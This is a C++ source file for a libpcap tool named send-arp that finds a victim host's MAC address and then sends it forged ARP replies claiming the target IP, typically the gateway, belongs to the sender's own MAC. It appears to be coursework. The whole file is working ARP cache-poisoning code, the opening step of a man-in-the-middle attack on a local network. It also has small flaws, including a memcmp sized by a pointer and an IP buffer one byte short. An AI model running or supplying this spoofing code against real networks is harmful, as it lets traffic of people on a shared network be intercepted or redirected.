#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
//#include <net/if.h>
//#include <net/if_arp.h>
#include <sys/types.h>
#include <libnet.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage();
int getMacIp(char* device, char* myip, char* mymac);
void leakSenderMac(pcap_t* handler,char* myIp,char* myMac,char* senderIp , char* senderMac);
EthArpPacket createPacket(char* smac, char* dmac, char* sip, char* dip, bool isRequest);
void sendPacket(pcap_t* handle, EthArpPacket packet);
void sendArp(pcap_t* handle, char* senderIp, char* senderMac,char* targetIp, char* myMac);


///////////     MAIN     /////////////
int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc%2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	struct pcap_pkthdr* header;
	const unsigned char* packet;
	int res = pcap_next_ex(handle, &header, &packet);

	char myIp[15] = {0};			// 15  == len of IPv4 String
	char myMac[20] = {0};			// 20  == len of MAC Addr String 
	char senderMac[20] = {0};
	char* senderIp;
	char* targetIp;

	for(int i = 2 ; i < argc ; i+=2){
		senderIp = argv[i];
		targetIp = argv[i+1];

		getMacIp(dev,myIp,myMac);									//Find My MAC Addr
		leakSenderMac(handle,myIp,myMac,senderIp,senderMac);		//Find Sender's MAC Addr
		sendArp(handle,senderIp, senderMac, targetIp, myMac);		//Send ARP Packet 

	}
	
	pcap_close(handle);

}/////////		END MAIN		//////////

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


int getMacIp(char* device, char* myip, char* mymac)
{
	struct ifreq ifr;
	int sockfd, ret, ret2;
	uint8_t mac_addr8[6]; //Mac len = 6 

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("fail to get interface mac and ip, socket failed\n");
		return -1;
	}

	strncpy(ifr.ifr_name, device, IFNAMSIZ );
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface Mac and Ip - ioctl failed\n");
		//close(sockfd);
		return -1;
	}

	memcpy(mac_addr8, ifr.ifr_hwaddr.sa_data, 6);
	sprintf(mymac,"%02x:%02x:%02x:%02x:%02x:%02x",mac_addr8[0],mac_addr8[1],mac_addr8[2],mac_addr8[3],mac_addr8[4],mac_addr8[5]);

	ret2 = ioctl(sockfd, SIOCGIFADDR, &ifr);
	if (ret2 < 0){
		printf("Fail to get interface Mac and Ip - ioctl failed\n");
		//close(sockfd);
		return -1;
	}

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, myip ,sizeof(struct sockaddr)); 
	
	//for debug
	//printf("MyIp : %s\n",myip);
	//printf("MyMac : %s\n",mymac);
	

}





void leakSenderMac(pcap_t* handler,char* myIp,char* myMac,char* senderIp , char* senderMac){

	struct pcap_pkthdr* replyPacketr;
	const unsigned char* pkt_data;
	EthArpPacket packet;
	int res;
	u_int8_t*  mac_addr;
	struct libnet_ethernet_hdr *eth;
	char* myMac2 = myMac;


	packet = createPacket(myMac2,"ff:ff:ff:ff:ff:ff", myIp, senderIp, true);
	sendPacket(handler, packet);

	while(1)
	{
		res = pcap_next_ex(handler, &replyPacketr, &pkt_data);
		
		if (res == 0){
			printf("res == 0");
			return;
			}
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handler));
			return;
			}
		eth = (struct libnet_ethernet_hdr *)pkt_data;
		if(ntohs(eth->ether_type) == ETHERTYPE_ARP) //  ETHERTYPE_ARP = 0x806
			break;

	}
	

	mac_addr = (u_int8_t*)eth->ether_shost;
	sprintf(senderMac,"%02x:%02x:%02x:%02x:%02x:%02x",mac_addr[0],mac_addr[1],mac_addr[2],mac_addr[3],mac_addr[4],mac_addr[5]);
 
	//printf("leak = %s \n",senderMac);
	
}


EthArpPacket createPacket(char* smac, char* dmac, char* sip, char* dip, bool isRequest){

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(dmac);
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if(isRequest)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else
		packet.arp_.op_ = htons(ArpHdr::Reply);
	
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	if(memcmp("ff:ff:ff:ff:ff:ff",dmac,sizeof(dmac))!=0)
		packet.arp_.tmac_ = Mac(dmac);
	else
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	
	packet.arp_.tip_ = htonl(Ip(dip));

	return packet;

}

void sendArp(pcap_t* handle, char* senderIp,char* senderMac,char* targetIp, char* myMac){

	EthArpPacket packet = createPacket(myMac, senderMac, targetIp, senderIp, false);

	puts("\n=====================================");
	printf("sender ip	= %s \n",senderIp);
	printf("sender mac	= %s \n",senderMac);
	printf("target ip	= %s\n",targetIp);
	printf("my mac  	= %s\n",myMac);
	sendPacket(handle,packet);
	puts("done");
	puts("=====================================\n");
}



void sendPacket(pcap_t* handle, EthArpPacket packet){
	//Send Packet And Print Error Func
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	//pcap_close(handle);
}
